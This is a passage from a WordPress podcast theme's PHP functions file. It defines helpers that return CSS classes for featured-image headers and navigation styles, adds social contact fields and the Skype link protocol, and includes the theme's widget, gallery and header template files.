            if (has_post_thumbnail($post_id)) {
                $output = 'has-featured-image';
            } else {
                $output = 'no-featured-image';
            }
        } elseif (!is_home() && is_front_page()) {
            //Used on Front Page
            $featured_header_img = pod_theme_option('pod-upload-frontpage-header');

            if (isset($featured_header_img['url']) != '') {
                $output = 'has-featured-image';
            } else {
                $output = 'no-featured-image';
            }
        } elseif (!is_front_page() && is_home()) {
            //Used on Blog Page
            $blog_header_img = pod_theme_option('pod-blog-header');

            if ($blog_header_img['url'] != '') {
                $output = 'has-featured-image';
            } else {
                $output = 'no-featured-image';
            }
        } else {
            echo ' 4 ';
            $output = 'no-featured-image';
        }
        return $output;
    }
}

/**
 * pod_audio_format_featured_image()
 * Checks if the featured image is to be displayed as thumbnail or background in an audio post.
 *
 * @return string $output - custom class depending on whether the featured image is set to thumbnail or background.
 */
if (!function_exists('pod_audio_format_featured_image')) {
    function pod_audio_format_featured_image()
    {
        $audio_featured_img = pod_theme_option('pod-single-header-display');
        $format = get_post_format();
        $post_type = get_post_type();
        if (is_single() && ($format == 'audio' || $post_type == 'podcast')) {

            if ($audio_featured_img == 'has-background') {
                $output = 'audio-featured-image-background';
            } else {
                $output = 'audio-featured-image-thumbnail';
            }
        } elseif (is_single() && ($format == 'video')) {
            $output = 'video-featured-image-background';
        } else {
            $output = '';
        }
        return $output;
    }
}

/**
 * pod_is_nav_transparent()
 * Checks if the navigation bar is set to transparent in the theme options.
 *
 * @return string $output - custom class depending on whether the navigation bar is transparent or not.
 */
if (!function_exists('pod_is_nav_transparent')) {
    function pod_is_nav_transparent()
    {
        $is_trans = pod_theme_option('pod-nav-bg');

        if ($is_trans == 'transparent') {
            $output = 'nav-transparent';
        } else {
            $output = 'nav-solid';
        }
        return $output;
    }
}

/**
 * pod_is_nav_sticky()
 * Checks if the navigation bar is set to "sticky" in the theme options.
 *
 * @return string $output - custom class depending on whether the navigation bar is sticky or not.
 */
if (!function_exists('pod_is_nav_sticky')) {
    function pod_is_nav_sticky($classes = "")
    {
        $is_sticky = pod_theme_option('pod-sticky-header');

        if ($is_sticky == true) {
            $output = 'nav-sticky ' . $classes;
        } else {
            $output = 'nav-not-sticky';
        }
        return $output;
    }
}

/**
 * pod_allow_skype_protocol()
 * Adds the "skype" protcol to the allowed WP protcols.
 *
 * @return array $protocols - an array containing the new protocols.
 */
function pod_allow_skype_protocol($protocols)
{
    $protocols[] = 'skype';
    return $protocols;
}
add_filter('kses_allowed_protocols', 'pod_allow_skype_protocol');

/**
 * thst_user_contactmethods()
 * Add more fields to the contact info form.
 *
 * @param array $user_contactmethods - Default user contact methods.
 * @return array $$user_contactmethods - Added new user contact methods.
 */
if (!function_exists('thst_user_contactmethods')) {
    function thst_user_contactmethods($user_contactmethods)
    {

        $user_contactmethods['user_position'] = 'Position';
        $user_contactmethods['user_rss'] = 'RSS';
        $user_contactmethods['user_skype'] = 'Skype';
        $user_contactmethods['user_twitter'] = 'Twitter';
        $user_contactmethods['user_facebook'] = 'Facebook';
        $user_contactmethods['user_googleplus'] = 'Google Plus';
        $user_contactmethods['user_youtube'] = 'Youtube';
        $user_contactmethods['user_dribbble'] = 'Dribbble';
        $user_contactmethods['user_flickr'] = 'Flickr';
        $user_contactmethods['user_instagram'] = 'Instagram';
        $user_contactmethods['user_snapchat'] = 'Snapchat';
        $user_contactmethods['user_soundcloud'] = 'Soundcloud';
        $user_contactmethods['user_mixcloud'] = 'Mixcloud';
        $user_contactmethods['user_spotify'] = 'Spotify';
        $user_contactmethods['user_itunes'] = 'iTunes';
        $user_contactmethods['user_vine'] = 'Vine';
        $user_contactmethods['user_tumblr'] = 'Tumblr';
        $user_contactmethods['user_pinterest'] = 'Pinterest';
        $user_contactmethods['user_xing'] = 'Xing';
        $user_contactmethods['user_linkedin'] = 'Linkedin';
        $user_contactmethods['user_github'] = 'Github';
        $user_contactmethods['user_stackex'] = 'Stack Exchange';

        return $user_contactmethods;
    }
}
add_filter('user_contactmethods', 'thst_user_contactmethods');

/*
 * Custom Widgets: Recent Posts
 * */
get_template_part('widgets/widget', 'recentposts');

/**
 * Custom Widgets: Recent Comments
 */
get_template_part('widgets/widget', 'recentcomments');

/**
 * Custom Widget: Highight Category
 */
get_template_part('widgets/widget', 'highlightcategory');

/**
 * List Comments
 */
include_once get_template_directory() . '/thst-listcomments.php';

/**
 * Lists images when gallery is inserted into post or page
 */
$options = get_option('podcaster-theme');
if (is_array($options) && isset($options["pod-pofo-gallery"])) {
    $pofo_gallery_style = $options["pod-pofo-gallery"];

    if (isset($pofo_gallery_style) && $pofo_gallery_style == "slideshow_on") {
        include_once get_template_directory() . '/thst-gallery_slide.php';
    } else {
        include_once get_template_directory() . '/thst-gallery_grid.php';
    }
}

/**
 * Recommended Plugins
 */
include_once get_template_directory() . '/functions/tgmpa/reccommend_plg.php';

/**
 * New & Improved Featured Header
 */
include_once get_template_directory() . '/functions/featured-header.php';
